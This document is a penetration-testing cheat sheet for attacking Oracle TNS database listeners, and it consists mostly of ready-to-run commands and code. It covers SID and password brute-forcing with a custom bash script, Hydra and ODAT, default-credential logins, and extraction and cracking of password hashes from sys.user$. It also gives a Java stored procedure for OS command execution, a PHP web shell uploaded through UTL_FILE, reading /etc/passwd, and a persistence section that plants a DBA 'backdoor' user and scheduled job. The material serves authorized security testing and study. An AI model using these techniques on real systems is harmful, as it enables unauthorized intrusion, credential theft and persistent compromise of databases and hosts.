# Oracle TNS Enumeration Cheat Sheet

## Table of Contents
1. [Overview](#overview)
2. [Ports & Protocols](#ports--protocols)
3. [Quick Discovery](#quick-discovery)
4. [Essential Enumeration Workflow](#essential-enumeration-workflow)
   - [Service Detection](#1-service-detection)
   - [SID Enumeration](#2-sid-enumeration)
   - [Authentication Testing](#3-authentication-testing)
   - [Database Interaction](#4-database-interaction)
5. [Manual Interaction](#manual-interaction)
   - [SQLPlus Connection](#sqlplus-connection)
   - [Oracle SQL Commands](#oracle-sql-commands)
   - [System Information Queries](#system-information-queries)
6. [Credential Attacks](#credential-attacks)
7. [Advanced Techniques](#advanced-techniques)
8. [ODAT Framework](#odat-framework)
9. [Common Vulnerabilities](#common-vulnerabilities)
10. [Quick Reference Commands](#quick-reference-commands)
11. [Testing Checklist](#testing-checklist)
12. [Critical Security Issues](#critical-security-issues)

---

## Overview

**Oracle TNS (Transparent Network Substrate)** is Oracle's proprietary networking technology that enables communication between Oracle databases and client applications. TNS serves as the foundation for Oracle Net Services and handles connection management, load balancing, and security for Oracle database connections.

### Key Functions
- **Connection Management**: Handles client-to-database connections
- **Load Balancing**: Distributes connections across multiple database instances
- **Security**: Provides encryption and authentication mechanisms
- **Name Resolution**: Resolves service names to network addresses
- **Protocol Support**: Supports TCP/IP, UDP, IPX/SPX protocols

### Why Oracle TNS Matters in Pentesting
- **Enterprise Databases**: Often contains sensitive business-critical data
- **Weak Authentication**: Default accounts with known passwords
- **Privilege Escalation**: Database access can lead to system compromise
- **File System Access**: Oracle utilities allow file operations
- **Network Exposure**: Database services accessible from network

### Common Attack Vectors
- **SID Enumeration**: Discovering database instance identifiers
- **Default Credentials**: Oracle default accounts and passwords
- **SQL Injection**: Exploiting database queries and procedures
- **File Upload**: Uploading web shells through database utilities
- **Privilege Escalation**: Gaining SYSDBA privileges

---

## Ports & Protocols

```
1521/tcp - Oracle TNS Listener (default)
1522-1529/tcp - Alternative TNS ports
1630/tcp - Oracle Connection Manager
```

### Oracle Components
| Component | Port | Purpose | Security Notes |
|-----------|------|---------|----------------|
| **TNS Listener** | 1521/tcp | Database connections | Primary attack target |
| **Oracle EM** | 1158/tcp | Enterprise Manager | Web management interface |
| **Oracle XDB** | 8080/tcp | XML DB HTTP | Web-based database access |

---

## Quick Discovery

```bash
# Port scan for Oracle TNS
nmap -p 1521,1522-1529 --open -sV target

# Oracle-specific scripts
nmap -p 1521 --script=oracle-* target

# TNS version detection
nmap -p 1521 -sV --script=oracle-tns-version target
```

---

## Essential Enumeration Workflow

### 1. Service Detection

#### Basic Oracle TNS Detection
```bash
# Standard port scan
nmap -p 1521 -sV target

# TNS version information
nmap -p 1521 --script=oracle-tns-version target

# Comprehensive Oracle scan
nmap -p 1521 --script=oracle-enum-users,oracle-sid-brute target
```

#### Alternative Port Discovery
```bash
# Scan common Oracle ports
nmap -p 1521-1529,1630,8080 --open -sV target

# UDP TNS listener discovery
nmap -sU -p 1521 target
```

### 2. SID Enumeration

#### Nmap SID Brute Force
```bash
# Default SID enumeration
nmap -p 1521 --script=oracle-sid-brute target

# Custom SID wordlist
nmap -p 1521 --script=oracle-sid-brute --script-args oracle-sid-brute.sid=wordlist.txt target

# Aggressive SID enumeration
nmap -p 1521 --script=oracle-sid-brute --script-args oracle-sid-brute.aggressive=true target
```

#### ODAT SID Discovery
```bash
# SID guessing with ODAT
./odat.py sidguesser -s target

# SID guessing with custom wordlist
./odat.py sidguesser -s target --sids-file wordlists/sid.txt

# Verbose SID enumeration
./odat.py sidguesser -s target -v
```

#### Manual SID Testing
```bash
# Common Oracle SIDs to test
SIDs="XE ORCL PLSExtProc XEXDB"

for sid in $SIDs; do
    echo "Testing SID: $sid"
    sqlplus system/manager@target:1521/$sid
done
```

### 3. Authentication Testing

#### Default Credentials Testing
```bash
# Common Oracle default accounts
sqlplus system/manager@target:1521/XE
sqlplus sys/change_on_install@target:1521/XE as sysdba
sqlplus scott/tiger@target:1521/XE
sqlplus hr/hr@target:1521/XE
sqlplus dbsnmp/dbsnmp@target:1521/XE

# Test without specifying SID (uses default)
sqlplus system/manager@target:1521
```

#### ODAT Password Attacks
```bash
# Password guessing for specific user
./odat.py passwordguesser -s target -d XE -U scott

# Brute force multiple users
./odat.py passwordguesser -s target -d XE --accounts-file accounts.txt

# Custom password list
./odat.py passwordguesser -s target -d XE -U system --passwords-file passwords.txt
```

### 4. Database Interaction

#### Basic Connection
```bash
# Connect with discovered credentials
sqlplus scott/tiger@target:1521/XE

# Connect as SYSDBA
sqlplus scott/tiger@target:1521/XE as sysdba

# Connect using TNS alias
sqlplus scott/tiger@target
```

#### Information Gathering
```sql
-- Database version
SELECT * FROM v$version;

-- Current user privileges
SELECT * FROM user_role_privs;

-- System information
SELECT * FROM v$instance;

-- Database name
SELECT name FROM v$database;
```

---

## Manual Interaction

### SQLPlus Connection

#### Connection Syntax
```bash
# Standard connection
sqlplus username/password@host:port/SID

# SYSDBA connection
sqlplus username/password@host:port/SID as sysdba

# Local connection (if on same machine)
sqlplus username/password

# Connection with specific role
sqlplus username/password@host:port/SID as sysoper
```

#### Connection Troubleshooting
```bash
# Fix library path issues
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

# Configure TNS_ADMIN
export TNS_ADMIN=/opt/oracle/instantclient_21_4/network/admin

# Test connection without authentication
sqlplus /nolog
SQL> connect username/password@host:port/SID
```

### Oracle SQL Commands

#### Basic Information Queries
```sql
-- Database version and edition
SELECT banner FROM v$version;

-- Current user information
SELECT user FROM dual;
SELECT sys_context('USERENV', 'CURRENT_USER') FROM dual;

-- Session information
SELECT sys_context('USERENV', 'SESSION_USER') FROM dual;
SELECT sys_context('USERENV', 'IP_ADDRESS') FROM dual;

-- Database information
SELECT name, created, log_mode FROM v$database;
SELECT instance_name, host_name, status FROM v$instance;
```

#### User and Privilege Enumeration
```sql
-- List all users
SELECT username, account_status, created FROM dba_users;

-- Current user privileges
SELECT * FROM user_role_privs;
SELECT * FROM user_sys_privs;

-- All system privileges
SELECT grantee, privilege FROM dba_sys_privs WHERE grantee = 'SCOTT';

-- Role information
SELECT granted_role FROM user_role_privs;
SELECT role FROM dba_roles;

-- Administrative users
SELECT username FROM dba_users WHERE username IN ('SYS','SYSTEM','SYSMAN','DBSNMP');
```

### System Information Queries

#### Database Schema Enumeration
```sql
-- List all tables accessible to current user
SELECT table_name FROM all_tables;

-- List tables owned by current user
SELECT table_name FROM user_tables;

-- List all schemas/users with tables
SELECT DISTINCT owner FROM all_tables ORDER BY owner;

-- Get table structure
DESCRIBE table_name;
SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'TABLE_NAME';
```

#### Sensitive Data Discovery
```sql
-- Search for tables with specific names
SELECT owner, table_name FROM all_tables WHERE table_name LIKE '%USER%';
SELECT owner, table_name FROM all_tables WHERE table_name LIKE '%PASS%';
SELECT owner, table_name FROM all_tables WHERE table_name LIKE '%CRED%';

-- Search for columns with sensitive names
SELECT table_name, column_name FROM all_tab_columns 
WHERE column_name LIKE '%PASS%' OR column_name LIKE '%PWD%';

-- Find views
SELECT view_name FROM all_views;
```

---

## Credential Attacks

### Brute Force Attacks

#### Hydra
```bash
# Oracle TNS brute force
hydra -L users.txt -P passwords.txt oracle-listener://target

# Single user attack
hydra -l system -P passwords.txt oracle-listener://target

# Specify SID
hydra -L users.txt -P passwords.txt oracle-listener://target:1521/XE
```

#### Custom Oracle Brute Force Script
```bash
#!/bin/bash
# Oracle brute force script

TARGET=$1
SID=$2
USERS=("system" "sys" "scott" "hr" "dbsnmp" "oracle")
PASSWORDS=("manager" "change_on_install" "tiger" "hr" "dbsnmp" "oracle" "password" "admin")

for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo "Testing $user:$pass"
        echo "SELECT 1 FROM dual;" | sqlplus -S $user/$pass@$TARGET:1521/$SID 2>/dev/null | grep -q "^1$" && echo "[+] Valid: $user:$pass"
    done
done
```

#### ODAT Comprehensive Testing
```bash
# Test all ODAT modules
./odat.py all -s target -d XE

# Specific password guessing
./odat.py passwordguesser -s target -d XE -U system -P passwords.txt

# User enumeration
./odat.py passwordguesser -s target -d XE --accounts-file users.txt
```

---

## Advanced Techniques

### Password Hash Extraction

#### Extract User Hashes
```sql
-- Oracle 10g/11g password hashes
SELECT name, password FROM sys.user$;

-- Oracle 12c+ password hashes
SELECT name, spare4 FROM sys.user$;

-- User account information
SELECT username, password, account_status FROM dba_users;

-- Extract to file (if permissions allow)
SELECT name||':'||password FROM sys.user$;
```

#### Hash Cracking
```bash
# Hashcat Oracle hash cracking
hashcat -m 3100 hashes.txt wordlist.txt    # Oracle 11g
hashcat -m 12300 hashes.txt wordlist.txt   # Oracle 12c+

# John the Ripper
john --format=oracle11 hashes.txt
john --format=oracle12c hashes.txt
```

### File System Operations

#### File Upload via UTL_FILE
```sql
-- Check UTL_FILE_DIR parameter
SELECT value FROM v$parameter WHERE name = 'utl_file_dir';

-- Create file
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('/tmp', 'test.txt', 'W');
  UTL_FILE.PUT_LINE(f, 'Test content');
  UTL_FILE.FCLOSE(f);
END;
/
```

#### ODAT File Operations
```bash
# Upload file
./odat.py utlfile -s target -d XE -U scott -P tiger --putFile /var/www/html shell.php ./shell.php

# Download file
./odat.py utlfile -s target -d XE -U scott -P tiger --getFile /etc/passwd passwd.txt

# Check file permissions
./odat.py utlfile -s target -d XE -U scott -P tiger --test-all
```

### Java Stored Procedures

#### Execute System Commands
```sql
-- Enable Java
SELECT value FROM v$parameter WHERE name = 'java_pool_size';

-- Create Java class for command execution
CREATE OR REPLACE JAVA SOURCE NAMED "CommandExec" AS
import java.io.*;
public class CommandExec {
    public static String execCmd(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            StringBuilder sb = new StringBuilder();
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
            }
            return sb.toString();
        } catch (Exception e) {
            return e.getMessage();
        }
    }
}
/

-- Create PL/SQL wrapper
CREATE OR REPLACE FUNCTION exec_cmd(cmd VARCHAR2) RETURN VARCHAR2 AS
LANGUAGE JAVA NAME 'CommandExec.execCmd(java.lang.String) return java.lang.String';
/

-- Execute commands
SELECT exec_cmd('whoami') FROM dual;
SELECT exec_cmd('id') FROM dual;
```

---

## ODAT Framework

### Installation and Setup
```bash
# Download Oracle Instant Client
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip

# Extract and configure
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH

# Clone and setup ODAT
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip3 install cx_Oracle python-libnmap colorlog termcolor passlib pycryptodome
```

### ODAT Module Usage

#### Comprehensive Testing
```bash
# Test all modules
./odat.py all -s target -d XE -U scott -P tiger

# Test specific functionality
./odat.py all -s target -d XE -U scott -P tiger --sysdba

# Verbose output
./odat.py all -s target -d XE -U scott -P tiger -v
```

#### Specific Module Testing
```bash
# SID guessing
./odat.py sidguesser -s target

# Password guessing
./odat.py passwordguesser -s target -d XE

# File operations
./odat.py utlfile -s target -d XE -U scott -P tiger --test-all

# HTTP operations
./odat.py utlhttp -s target -d XE -U scott -P tiger --test-all

# Java exploitation
./odat.py java -s target -d XE -U scott -P tiger --test-all
```

---

## Common Vulnerabilities

### Default Credentials
```bash
# VULNERABILITY: Default Oracle accounts
sqlplus system/manager@target:1521/XE
sqlplus scott/tiger@target:1521/XE
sqlplus hr/hr@target:1521/XE

# VULNERABILITY: Default DBSNMP account
sqlplus dbsnmp/dbsnmp@target:1521/XE
```

### Privilege Escalation
```sql
-- VULNERABILITY: SYSDBA access with regular account
sqlplus scott/tiger@target:1521/XE as sysdba

-- Check if successful escalation
SELECT * FROM user_role_privs;
-- Result shows SYS privileges instead of SCOTT
```

### Information Disclosure
```sql
-- VULNERABILITY: Access to sensitive system tables
SELECT * FROM dba_users;
SELECT name, password FROM sys.user$;

-- VULNERABILITY: Database configuration exposure
SELECT * FROM v$parameter;
```

### File System Access
```bash
# VULNERABILITY: File upload capabilities
./odat.py utlfile -s target -d XE -U scott -P tiger --putFile /var/www/html shell.php ./shell.php

# VULNERABILITY: File download capabilities
./odat.py utlfile -s target -d XE -U scott -P tiger --getFile /etc/passwd passwd.txt
```

---

## Quick Reference Commands

### Discovery
```bash
nmap -p 1521 --script=oracle-sid-brute target
./odat.py sidguesser -s target
sqlplus system/manager@target:1521/XE
```

### Authentication
```bash
./odat.py passwordguesser -s target -d XE -U system
hydra -L users.txt -P passwords.txt oracle-listener://target
sqlplus scott/tiger@target:1521/XE as sysdba
```

### Enumeration
```sql
SELECT * FROM v$version;
SELECT * FROM user_role_privs;
SELECT table_name FROM all_tables;
SELECT name, password FROM sys.user$;
```

### File Operations
```bash
./odat.py utlfile -s target -d XE -U scott -P tiger --putFile /path/file.php ./file.php
./odat.py utlfile -s target -d XE -U scott -P tiger --getFile /etc/passwd passwd.txt
```

---

## Testing Checklist

#### Discovery & Detection
- [ ] Port 1521 open and accessible
- [ ] Oracle TNS version identification
- [ ] Alternative port discovery
- [ ] Service banner analysis

#### SID Enumeration
- [ ] Default SID testing (XE, ORCL)
- [ ] SID brute force attacks
- [ ] Custom SID wordlist testing
- [ ] Service name enumeration

#### Authentication Testing
- [ ] Default credential testing
- [ ] Password brute force attacks
- [ ] Account status verification
- [ ] SYSDBA privilege testing

#### Database Enumeration
- [ ] Schema and table discovery
- [ ] User and privilege enumeration
- [ ] System configuration analysis
- [ ] Sensitive data identification

#### File System Testing
- [ ] File upload capabilities
- [ ] File download testing
- [ ] Directory traversal attempts
- [ ] Web shell deployment

---

## Critical Security Issues

### Default Credentials
- **Impact**: Full database access, privilege escalation
- **Detection**: Successful login with default accounts
- **Exploitation**: `sqlplus system/manager@target:1521/XE`

### SYSDBA Privilege Escalation
- **Impact**: Complete database administrative access
- **Detection**: Regular user can connect as SYSDBA
- **Exploitation**: `sqlplus scott/tiger@target:1521/XE as sysdba`

### File System Access
- **Impact**: Web shell upload, sensitive file disclosure
- **Detection**: Successful file operations via UTL_FILE
- **Exploitation**: Web shell deployment, configuration file access

### Information Disclosure
- **Impact**: Password hash exposure, sensitive data access
- **Detection**: Access to sys.user$ and other system tables
- **Exploitation**: Password cracking, data exfiltration

### Network Exposure
- **Impact**: Remote database access, increased attack surface
- **Detection**: TNS listener accessible from external networks
- **Exploitation**: Remote enumeration and exploitation

---

## Common Oracle SIDs

### Default SIDs
```
XE          - Oracle Express Edition
ORCL        - Oracle Database
PLSExtProc  - PL/SQL External Procedures
XEXDB       - Oracle XE XML Database
```

### Enterprise SIDs
```
PROD        - Production database
DEV         - Development database
TEST        - Testing database
STAGE       - Staging database
DB01        - Generic database naming
```

---

## Default Oracle Accounts

### System Accounts
```
sys/change_on_install   - System administrator
system/manager         - System DBA
sysman/sysman          - Enterprise Manager
dbsnmp/dbsnmp          - SNMP monitoring
```

### Application Accounts
```
scott/tiger            - Sample schema
hr/hr                  - Human Resources schema
oe/oe                  - Order Entry schema
sh/sh                  - Sales History schema
```

---

## Oracle Configuration Files

### TNS Configuration
```bash
# tnsnames.ora - Client-side service names
$ORACLE_HOME/network/admin/tnsnames.ora

# listener.ora - Server-side listener configuration
$ORACLE_HOME/network/admin/listener.ora

# sqlnet.ora - Network configuration
$ORACLE_HOME/network/admin/sqlnet.ora
```

### Common Paths
```
Linux:   $ORACLE_HOME/network/admin/
Windows: %ORACLE_HOME%\network\admin\
```

---

## Advanced Exploitation

### Web Shell Deployment
```bash
# Create PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload to web directory
./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile /var/www/html shell.php ./shell.php

# Access web shell
curl http://target/shell.php?cmd=whoami
```

### Persistence Techniques
```sql
-- Create backdoor user
CREATE USER backdoor IDENTIFIED BY password;
GRANT CONNECT, RESOURCE, DBA TO backdoor;

-- Create job for persistence
BEGIN
  DBMS_SCHEDULER.CREATE_JOB(
    job_name => 'BACKDOOR_JOB',
    job_type => 'PLSQL_BLOCK',
    job_action => 'BEGIN NULL; END;',
    start_date => SYSTIMESTAMP,
    repeat_interval => 'FREQ=DAILY',
    enabled => TRUE
  );
END;
/
```

### Data Exfiltration
```sql
-- Export sensitive data
SELECT username||':'||password FROM sys.user$;

-- Large data extraction
SELECT * FROM (SELECT * FROM sensitive_table) WHERE ROWNUM <= 1000;
```
